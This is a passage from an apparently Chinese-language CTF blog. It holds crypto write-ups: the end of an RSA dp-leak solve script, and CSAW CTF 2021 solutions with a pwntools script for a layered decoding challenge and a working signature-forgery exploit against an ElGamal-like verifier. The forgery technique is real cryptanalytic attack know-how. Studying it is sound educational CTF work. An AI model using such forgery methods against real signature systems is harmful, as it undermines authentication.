class="number">65537</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">55</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">192</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">211</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">118</span>, <span class="number">54</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">193</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">79</span>,</span><br><span class="line">       <span class="number">244</span>, <span class="number">190</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">27</span>, <span class="number">138</span>, <span class="number">42</span>, <span class="number">89</span>, <span class="number">158</span>, <span class="number">254</span>, <span class="number">159</span>, <span class="number">133</span>, <span class="number">78</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">163</span>, <span class="number">145</span>, <span class="number">248</span>, <span class="number">14</span>, <span class="number">179</span>, <span class="number">23</span>,</span><br><span class="line">       <span class="number">226</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">195</span>, <span class="number">75</span>, <span class="number">191</span>, <span class="number">237</span>, <span class="number">108</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">185</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">212</span>,</span><br><span class="line">       <span class="number">242</span>, <span class="number">21</span>, <span class="number">143</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">146</span>, <span class="number">119</span>, <span class="number">173</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">193</span>, <span class="number">173</span>, <span class="number">2</span>, <span class="number">224</span>, <span class="number">205</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">205</span>, <span class="number">108</span>,</span><br><span class="line">       <span class="number">28</span>, <span class="number">243</span>, <span class="number">80</span>, <span class="number">140</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">76</span>, <span class="number">217</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">202</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">10</span>, <span class="number">168</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">152</span>, <span class="number">48</span>, <span class="number">152</span>, <span class="number">51</span>, <span class="number">133</span>,</span><br><span class="line">       <span class="number">190</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">204</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">71</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">173</span>, <span class="number">19</span>, <span class="number">201</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">85</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">59</span>,</span><br><span class="line">       <span class="number">186</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">147</span>, <span class="number">219</span>, <span class="number">22</span>, <span class="number">81</span>]</span><br><span class="line">seeds = [<span class="number">4827</span>, <span class="number">9522</span>, <span class="number">552</span>, <span class="number">880</span>, <span class="number">7467</span>, <span class="number">7742</span>, <span class="number">9425</span>, <span class="number">4803</span>, <span class="number">6146</span>, <span class="number">4366</span>, <span class="number">1126</span>, <span class="number">4707</span>, <span class="number">1138</span>, <span class="number">2367</span>, <span class="number">1081</span>, <span class="number">5577</span>, <span class="number">4592</span>, <span class="number">5897</span>, <span class="number">4565</span>,</span><br><span class="line">         <span class="number">2012</span>, <span class="number">2700</span>, <span class="number">1331</span>, <span class="number">9638</span>, <span class="number">7741</span>, <span class="number">50</span>, <span class="number">824</span>, <span class="number">8321</span>, <span class="number">7411</span>, <span class="number">6145</span>, <span class="number">1271</span>, <span class="number">7637</span>, <span class="number">5481</span>, <span class="number">8474</span>, <span class="number">2085</span>, <span class="number">2421</span>, <span class="number">590</span>, <span class="number">7733</span>, <span class="number">9427</span>,</span><br><span class="line">         <span class="number">3278</span>, <span class="number">5361</span>, <span class="number">1284</span>, <span class="number">2280</span>, <span class="number">7001</span>, <span class="number">8573</span>, <span class="number">5494</span>, <span class="number">7431</span>, <span class="number">2765</span>, <span class="number">827</span>, <span class="number">102</span>, <span class="number">1419</span>, <span class="number">6528</span>, <span class="number">735</span>, <span class="number">5653</span>, <span class="number">109</span>, <span class="number">4158</span>, <span class="number">5877</span>, <span class="number">5975</span>,</span><br><span class="line">         <span class="number">1527</span>, <span class="number">3027</span>, <span class="number">9776</span>, <span class="number">5263</span>, <span class="number">5211</span>, <span class="number">1293</span>, <span class="number">5976</span>, <span class="number">7759</span>, <span class="number">3268</span>, <span class="number">1893</span>, <span class="number">6546</span>, <span class="number">4684</span>, <span class="number">419</span>, <span class="number">8334</span>, <span class="number">7621</span>, <span class="number">1649</span>, <span class="number">6840</span>, <span class="number">2975</span>,</span><br><span class="line">         <span class="number">8605</span>, <span class="number">5714</span>, <span class="number">2709</span>, <span class="number">1109</span>, <span class="number">358</span>, <span class="number">2858</span>, <span class="number">6868</span>, <span class="number">2442</span>, <span class="number">8431</span>, <span class="number">8316</span>, <span class="number">5446</span>, <span class="number">9356</span>, <span class="number">2817</span>, <span class="number">2941</span>, <span class="number">3177</span>, <span class="number">7388</span>, <span class="number">4149</span>, <span class="number">4634</span>,</span><br><span class="line">         <span class="number">4316</span>, <span class="number">5377</span>, <span class="number">4327</span>, <span class="number">1774</span>, <span class="number">6613</span>, <span class="number">5728</span>, <span class="number">1751</span>, <span class="number">8478</span>, <span class="number">3132</span>, <span class="number">4680</span>, <span class="number">3308</span>, <span class="number">9769</span>, <span class="number">8341</span>, <span class="number">1627</span>, <span class="number">3501</span>, <span class="number">1046</span>, <span class="number">2609</span>, <span class="number">7190</span>,</span><br><span class="line">         <span class="number">5706</span>, <span class="number">3627</span>, <span class="number">8867</span>, <span class="number">2458</span>, <span class="number">607</span>, <span class="number">642</span>, <span class="number">5436</span>, <span class="number">6355</span>, <span class="number">6326</span>, <span class="number">1481</span>, <span class="number">9887</span>, <span class="number">205</span>, <span class="number">5511</span>, <span class="number">537</span>, <span class="number">8576</span>, <span class="number">6376</span>, <span class="number">3619</span>, <span class="number">6609</span>, <span class="number">8473</span>,</span><br><span class="line">         <span class="number">2139</span>, <span class="number">3889</span>, <span class="number">1309</span>, <span class="number">9878</span>, <span class="number">2182</span>, <span class="number">8572</span>, <span class="number">9275</span>, <span class="number">5235</span>, <span class="number">6989</span>, <span class="number">6592</span>, <span class="number">4618</span>, <span class="number">7883</span>, <span class="number">5702</span>, <span class="number">3999</span>, <span class="number">925</span>, <span class="number">2419</span>, <span class="number">7838</span>, <span class="number">3073</span>, <span class="number">488</span>,</span><br><span class="line">         <span class="number">21</span>, <span class="number">3280</span>, <span class="number">9915</span>, <span class="number">3672</span>, <span class="number">579</span>]</span><br><span class="line">dp = <span class="string">r&#x27;&#x27;</span></span><br><span class="line">rands = [[<span class="number">58</span>, <span class="number">53</span>, <span class="number">122</span>], [<span class="number">145</span>, <span class="number">124</span>, <span class="number">244</span>], [<span class="number">5</span>, <span class="number">19</span>, <span class="number">192</span>], [<span class="number">255</span>, <span class="number">23</span>, <span class="number">64</span>], [<span class="number">57</span>, <span class="number">113</span>, <span class="number">194</span>], [<span class="number">246</span>, <span class="number">205</span>, <span class="number">162</span>], [<span class="number">112</span>, <span class="number">87</span>, <span class="number">95</span>],</span><br><span class="line">         [<span class="number">215</span>, <span class="number">147</span>, <span class="number">105</span>], [<span class="number">16</span>, <span class="number">131</span>, <span class="number">38</span>], [<span class="number">234</span>, <span class="number">36</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">61</span>, <span class="number">146</span>], [<span class="number">148</span>, <span class="number">61</span>, <span class="number">9</span>], [<span class="number">139</span>, <span class="number">77</span>, <span class="number">32</span>], [<span class="number">96</span>, <span class="number">56</span>, <span class="number">160</span>],</span><br><span class="line">         [<span class="number">121</span>, <span class="number">76</span>, <span class="number">17</span>], [<span class="number">114</span>, <span class="number">246</span>, <span class="number">92</span>], [<span class="number">178</span>, <span class="number">206</span>, <span class="number">60</span>], [<span class="number">168</span>, <span class="number">147</span>, <span class="number">26</span>], [<span class="number">168</span>, <span class="number">41</span>, <span class="number">68</span>], [<span class="number">24</span>, <span class="number">93</span>, <span class="number">84</span>], [<span class="number">175</span>, <span class="number">43</span>, <span class="number">88</span>],</span><br><span class="line">         [<span class="number">147</span>, <span class="number">97</span>, <span class="number">153</span>], [<span class="number">42</span>, <span class="number">94</span>, <span class="number">45</span>], [<span class="number">150</span>, <span class="number">103</span>, <span class="number">127</span>], [<span class="number">68</span>, <span class="number">163</span>, <span class="number">62</span>], [<span class="number">165</span>, <span class="number">37</span>, <span class="number">89</span>], [<span class="number">219</span>, <span class="number">248</span>, <span class="number">59</span>], [<span class="number">241</span>, <span class="number">182</span>, <span class="number">8</span>],</span><br><span class="line">         [<span class="number">140</span>, <span class="number">211</span>, <span class="number">146</span>], [<span class="number">88</span>, <span class="number">226</span>, <span class="number">2</span>], [<span class="number">48</span>, <span class="number">150</span>, <span class="number">56</span>], [<span class="number">87</span>, <span class="number">109</span>, <span class="number">255</span>], [<span class="number">227</span>, <span class="number">216</span>, <span class="number">65</span>], [<span class="number">23</span>, <span class="number">190</span>, <span class="number">10</span>], [<span class="number">5</span>, <span class="number">25</span>, <span class="number">64</span>],</span><br><span class="line">         [<span class="number">6</span>, <span class="number">12</span>, <span class="number">124</span>], [<span class="number">53</span>, <span class="number">113</span>, <span class="number">124</span>], [<span class="number">255</span>, <span class="number">192</span>, <span class="number">158</span>], [<span class="number">61</span>, <span class="number">239</span>, <span class="number">5</span>], [<span class="number">62</span>, <span class="number">108</span>, <span class="number">86</span>], [<span class="number">123</span>, <span class="number">44</span>, <span class="number">64</span>], [<span class="number">195</span>, <span class="number">192</span>, <span class="number">30</span>],</span><br><span class="line">         [<span class="number">30</span>, <span class="number">82</span>, <span class="number">95</span>], [<span class="number">56</span>, <span class="number">178</span>, <span class="number">165</span>], [<span class="number">68</span>, <span class="number">77</span>, <span class="number">239</span>], [<span class="number">106</span>, <span class="number">247</span>, <span class="number">226</span>], [<span class="number">17</span>, <span class="number">46</span>, <span class="number">114</span>], [<span class="number">91</span>, <span class="number">71</span>, <span class="number">156</span>], [<span class="number">157</span>, <span class="number">43</span>, <span class="number">182</span>],</span><br><span class="line">         [<span class="number">146</span>, <span class="number">6</span>, <span class="number">42</span>], [<span class="number">148</span>, <span class="number">143</span>, <span class="number">161</span>], [<span class="number">108</span>, <span class="number">33</span>, <span class="number">139</span>], [<span class="number">139</span>, <span class="number">169</span>, <span class="number">157</span>], [<span class="number">71</span>, <span class="number">140</span>, <span class="number">25</span>], [<span class="number">28</span>, <span class="number">153</span>, <span class="number">26</span>], [<span class="number">241</span>, <span class="number">221</span>, <span class="number">235</span>],</span><br><span class="line">         [<span class="number">28</span>, <span class="number">131</span>, <span class="number">141</span>], [<span class="number">159</span>, <span class="number">111</span>, <span class="number">184</span>], [<span class="number">47</span>, <span class="number">206</span>, <span class="number">11</span>], [<span class="number">220</span>, <span class="number">152</span>, <span class="number">157</span>], [<span class="number">41</span>, <span class="number">213</span>, <span class="number">97</span>], [<span class="number">4</span>, <span class="number">220</span>, <span class="number">10</span>], [<span class="number">77</span>, <span class="number">13</span>, <span class="number">248</span>],</span><br><span class="line">         [<span class="number">94</span>, <span class="number">140</span>, <span class="number">110</span>], [<span class="number">25</span>, <span class="number">250</span>, <span class="number">226</span>], [<span class="number">218</span>, <span class="number">102</span>, <span class="number">109</span>], [<span class="number">189</span>, <span class="number">238</span>, <span class="number">66</span>], [<span class="number">91</span>, <span class="number">18</span>, <span class="number">131</span>], [<span class="number">23</span>, <span class="number">239</span>, <span class="number">190</span>], [<span class="number">159</span>, <span class="number">33</span>, <span class="number">72</span>],</span><br><span class="line">         [<span class="number">183</span>, <span class="number">78</span>, <span class="number">208</span>], [<span class="number">209</span>, <span class="number">213</span>, <span class="number">101</span>], [<span class="number">111</span>, <span class="number">50</span>, <span class="number">220</span>], [<span class="number">166</span>, <span class="number">104</span>, <span class="number">233</span>], [<span class="number">170</span>, <span class="number">144</span>, <span class="number">10</span>], [<span class="number">187</span>, <span class="number">87</span>, <span class="number">175</span>],</span><br><span class="line">         [<span class="number">195</span>, <span class="number">59</span>, <span class="number">104</span>], [<span class="number">165</span>, <span class="number">179</span>, <span class="number">179</span>], [<span class="number">99</span>, <span class="number">247</span>, <span class="number">153</span>], [<span class="number">195</span>, <span class="number">61</span>, <span class="number">100</span>], [<span class="number">223</span>, <span class="number">159</span>, <span class="number">165</span>], [<span class="number">230</span>, <span class="number">93</span>, <span class="number">184</span>], [<span class="number">87</span>, <span class="number">28</span>, <span class="number">35</span>],</span><br><span class="line">         [<span class="number">35</span>, <span class="number">122</span>, <span class="number">38</span>], [<span class="number">158</span>, <span class="number">188</span>, <span class="number">163</span>], [<span class="number">229</span>, <span class="number">192</span>, <span class="number">222</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">192</span>], [<span class="number">207</span>, <span class="number">95</span>, <span class="number">224</span>], [<span class="number">127</span>, <span class="number">113</span>, <span class="number">137</span>],</span><br><span class="line">         [<span class="number">22</span>, <span class="number">114</span>, <span class="number">143</span>], [<span class="number">13</span>, <span class="number">45</span>, <span class="number">144</span>], [<span class="number">70</span>, <span class="number">140</span>, <span class="number">211</span>], [<span class="number">57</span>, <span class="number">101</span>, <span class="number">42</span>], [<span class="number">132</span>, <span class="number">62</span>, <span class="number">129</span>], [<span class="number">40</span>, <span class="number">128</span>, <span class="number">124</span>], [<span class="number">1</span>, <span class="number">132</span>, <span class="number">161</span>],</span><br><span class="line">         [<span class="number">164</span>, <span class="number">33</span>, <span class="number">133</span>], [<span class="number">252</span>, <span class="number">201</span>, <span class="number">32</span>], [<span class="number">8</span>, <span class="number">18</span>, <span class="number">247</span>], [<span class="number">1</span>, <span class="number">88</span>, <span class="number">55</span>], [<span class="number">201</span>, <span class="number">135</span>, <span class="number">186</span>], [<span class="number">101</span>, <span class="number">254</span>, <span class="number">125</span>], [<span class="number">236</span>, <span class="number">196</span>, <span class="number">39</span>],</span><br><span class="line">         [<span class="number">148</span>, <span class="number">24</span>, <span class="number">103</span>], [<span class="number">101</span>, <span class="number">29</span>, <span class="number">253</span>], [<span class="number">97</span>, <span class="number">156</span>, <span class="number">64</span>], [<span class="number">90</span>, <span class="number">103</span>, <span class="number">91</span>], [<span class="number">50</span>, <span class="number">48</span>, <span class="number">80</span>], [<span class="number">206</span>, <span class="number">22</span>, <span class="number">93</span>], [<span class="number">11</span>, <span class="number">114</span>, <span class="number">174</span>],</span><br><span class="line">         [<span class="number">61</span>, <span class="number">132</span>, <span class="number">247</span>], [<span class="number">215</span>, <span class="number">32</span>, <span class="number">232</span>], [<span class="number">95</span>, <span class="number">128</span>, <span class="number">90</span>], [<span class="number">57</span>, <span class="number">35</span>, <span class="number">228</span>], [<span class="number">163</span>, <span class="number">143</span>, <span class="number">107</span>], [<span class="number">178</span>, <span class="number">250</span>, <span class="number">28</span>], [<span class="number">64</span>, <span class="number">107</span>, <span class="number">225</span>],</span><br><span class="line">         [<span class="number">106</span>, <span class="number">115</span>, <span class="number">207</span>], [<span class="number">85</span>, <span class="number">134</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">201</span>, <span class="number">76</span>], [<span class="number">234</span>, <span class="number">34</span>, <span class="number">22</span>], [<span class="number">241</span>, <span class="number">236</span>, <span class="number">122</span>], [<span class="number">111</span>, <span class="number">185</span>, <span class="number">127</span>], [<span class="number">1</span>, <span class="number">26</span>, <span class="number">164</span>],</span><br><span class="line">         [<span class="number">254</span>, <span class="number">57</span>, <span class="number">117</span>], [<span class="number">243</span>, <span class="number">27</span>, <span class="number">32</span>], [<span class="number">161</span>, <span class="number">88</span>, <span class="number">80</span>], [<span class="number">50</span>, <span class="number">165</span>, <span class="number">93</span>], [<span class="number">87</span>, <span class="number">182</span>, <span class="number">216</span>], [<span class="number">184</span>, <span class="number">159</span>, <span class="number">63</span>], [<span class="number">167</span>, <span class="number">166</span>, <span class="number">123</span>],</span><br><span class="line">         [<span class="number">37</span>, <span class="number">78</span>, <span class="number">33</span>], [<span class="number">186</span>, <span class="number">81</span>, <span class="number">58</span>], [<span class="number">48</span>, <span class="number">3</span>, <span class="number">239</span>], [<span class="number">70</span>, <span class="number">186</span>, <span class="number">13</span>], [<span class="number">56</span>, <span class="number">108</span>, <span class="number">178</span>], [<span class="number">54</span>, <span class="number">55</span>, <span class="number">235</span>], [<span class="number">105</span>, <span class="number">180</span>, <span class="number">105</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">194</span>, <span class="number">98</span>], [<span class="number">136</span>, <span class="number">11</span>, <span class="number">41</span>], [<span class="number">18</span>, <span class="number">203</span>, <span class="number">79</span>], [<span class="number">185</span>, <span class="number">114</span>, <span class="number">170</span>], [<span class="number">148</span>, <span class="number">181</span>, <span class="number">223</span>], [<span class="number">118</span>, <span class="number">57</span>, <span class="number">160</span>], [<span class="number">23</span>, <span class="number">250</span>, <span class="number">181</span>],</span><br><span class="line">         [<span class="number">235</span>, <span class="number">219</span>, <span class="number">228</span>], [<span class="number">44</span>, <span class="number">151</span>, <span class="number">38</span>], [<span class="number">185</span>, <span class="number">224</span>, <span class="number">134</span>], [<span class="number">42</span>, <span class="number">162</span>, <span class="number">122</span>], [<span class="number">3</span>, <span class="number">9</span>, <span class="number">158</span>], [<span class="number">129</span>, <span class="number">245</span>, <span class="number">2</span>], [<span class="number">66</span>, <span class="number">241</span>, <span class="number">92</span>],</span><br><span class="line">         [<span class="number">80</span>, <span class="number">124</span>, <span class="number">36</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_dp</span>(<span class="params">n, p, e, c</span>):</span></span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = invert(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seeds)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="built_in">print</span>(rands)</span><br><span class="line">    dp += <span class="built_in">chr</span>(res[i] ^ rands[i % <span class="number">4</span>])</span><br><span class="line">dp = <span class="built_in">int</span>(dp)</span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># e * dp == (p-1) * X + 1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == (e*dp-<span class="number">1</span>) % X:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>) // X + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n % p:</span><br><span class="line">            flag = leak_dp(n, p, e, ct)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意，出题人应该是用python2跑的，因为python3跑出来的随机数和题目中不一样</p>
<h2 id="Crypto-secret-share（unsolved）"><a href="#Crypto-secret-share（unsolved）" class="headerlink" title="Crypto-secret_share（unsolved）"></a>Crypto-secret_share（unsolved）</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不管别人怎么说，这次题目还是挺好的，有些地方有些可惜，且行且变强吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210911 CSAWCTFCrypto方向部分WP</title>
    <url>/posts/e4da15f1/</url>
    <content><![CDATA[<p>好耶，妈妈以后再也不用担心，服务被关掉了</p>
<p>emmmmm没有源码，呜，苦露西</p>
<span id="more"></span>

<h1 id="CSAWCTF"><a href="#CSAWCTF" class="headerlink" title="CSAWCTF"></a>CSAWCTF</h1><h2 id="Gotta-Decrypt-Them-All"><a href="#Gotta-Decrypt-Them-All" class="headerlink" title="Gotta Decrypt Them All"></a>Gotta Decrypt Them All</h2><blockquote>
<p>nc crypto.chal.csaw.io 5001</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Morse <span class="keyword">import</span> morse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;crypto.chal.csaw.io&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line">letmesee = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;What does this mean?\r\n&#x27;</span>)</span><br><span class="line">        c1 = sh.recvline().decode().strip()</span><br><span class="line">        c1 = c1.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">            plaintext += <span class="built_in">chr</span>(<span class="built_in">int</span>(morse(i.strip(), <span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">        plaintext = b64decode(plaintext).decode()</span><br><span class="line">        plaintext = plaintext.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        c = <span class="built_in">int</span>(plaintext[<span class="number">2</span>][<span class="number">4</span>:])</span><br><span class="line">        plaintext = iroot(c, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        plaintext = long_to_bytes(plaintext).decode()</span><br><span class="line">        plaintext = codecs.encode(plaintext, <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line">        letmesee += plaintext</span><br><span class="line">        letmesee += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        sh.sendline(plaintext)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(letmesee)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Pokemon Names Wormadam Stonjourner Cloyster Jynx Zorua</p>
</blockquote>
<h2 id="Forgery（recuring）"><a href="#Forgery（recuring）" class="headerlink" title="Forgery（recuring）"></a>Forgery（recuring）</h2><blockquote>
<p>nc crypto.chal.csaw.io 5006</p>
</blockquote>
<blockquote>
<p>Felicity and Cisco would like to hire you as an intern for a new security company that they are forming. They have given you a black box signature verification system to test out and see if you can forge a signature. Forge it and you will get a passphrase to be hired!</p>
</blockquote>
<p>又是这个Forgery，伪造文书，先做RSA</p>
<hr>
<p>emmmmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">answer: <span class="built_in">str</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span></span><br><span class="line">    m = <span class="built_in">int</span>(answer, <span class="number">16</span>) &amp; MASK</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> [m, r, s]]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p</span><br></pre></td></tr></table></figure>

<p>emmmmm</p>
<p>不愧是春哥师傅，复现的时候竟然发现了是这道原题，<a href="https://blog.csdn.net/m0_49109277/article/details/120402679">贴我自己的链接好了（doge）</a>，第一种方法不是没看懂嘛，看看TIME上的能不能看懂（我擦127解，自己还是太菜了）</p>
<p>比赛结束了，那就自己挂自己打</p>
<p>这里g=3，嗯？老DC了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MASK = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = <span class="string">b&#x27;Felicity Cisco&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;Answer:&#x27;</span>).decode()</span><br><span class="line">    p, g, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    u, r, s = u + <span class="built_in">hex</span>((p - <span class="number">1</span>) // <span class="number">2</span>)[<span class="number">2</span>:].rjust(<span class="number">1024</span>, <span class="string">&#x27;0&#x27;</span>), (p - <span class="number">1</span>) // <span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    sh.sendline(u)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(s))</span><br><span class="line">    flag = sh.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922205145757.png" alt="image-20210922205145757"></p>
<p>观赏性</p>
<p>另外一种解法，参考这篇<a href="https://core.ac.uk/download/pdf/48535618.pdf">论文</a>，后面有证明，里面先假设我们已经有一个对$(r,\ s)$符合等式，其他的证明直接参考论文吧，目前对证明没什么感觉（emmmmm所以没有必要复现这种方法，直接抄论文）</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210924083850936.png" alt="image-20210924083850936"></p>
<p>为了使得<br>$$<br>g^u\equiv_py^rr^s<br>$$</p>
<p>直接抄论文里的结论</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210924152637456.png" alt="image-20210924152637456"></p>
<p>令（感觉论文有点小错，抄春哥师傅的，下面这样设置参数没问题）<br>$$<br>r\equiv_pg^By^C<br>$$<br>$$<br>s\equiv_{p-1}-rC^{-1}<br>$$<br>$$<br>u\equiv_{p-1}-rC^{-1}B<br>$$<br>随机选取$B, C\in[2, p-2]$</p>
